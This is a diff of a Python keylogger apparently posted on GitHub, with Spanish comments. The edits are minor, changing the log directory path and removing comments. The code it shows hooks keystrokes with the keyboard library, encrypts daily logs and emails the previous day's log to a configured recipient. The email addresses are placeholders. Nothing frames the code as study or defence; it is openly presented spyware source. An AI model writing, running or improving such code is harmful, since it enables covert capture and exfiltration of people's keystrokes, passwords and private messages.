@@ -1,7 +1,7 @@
 import os
 import logging
 from datetime import datetime
-import keyboard  # Usar la biblioteca keyboard en lugar de pynput
+import keyboard
 from crypto_utils import get_or_create_key, encrypt_data
 import smtplib
 from email.mime.multipart import MIMEMultipart
@@ -9,7 +9,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 
 # Configuración (rellenar con tus datos, obviamente no voy a subir los mios a github)
-LOGS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "logs")
+LOGS_DIR = os.path.join(os.path.dirname(__file__), "logs")
 EMAIL_FROM = "tu_correo@example.com"
 EMAIL_TO = "destinatario@example.com"
 EMAIL_SUBJECT = "Log del keylogger"
@@ -75,7 +75,6 @@ def log_key(event):
 
         log_file_path = get_log_file()
         if not os.path.exists(log_file_path):
-            # Enviar el log anterior por correo solo si es un nuevo día
             log_files = [os.path.join(LOGS_DIR, f) for f in os.listdir(LOGS_DIR)]
             if log_files:
                 previous_log_file = max(log_files, key=os.path.getctime)
@@ -87,7 +86,6 @@ def log_key(event):
     except Exception as e:
         logging.error(f"Error in log_key: {e}")
 
-# Iniciar el keylogger
 if __name__ == "__main__":
     logging.basicConfig(filename='keylogger_error.log', level=logging.DEBUG)
     logging.debug("Starting keylogger")
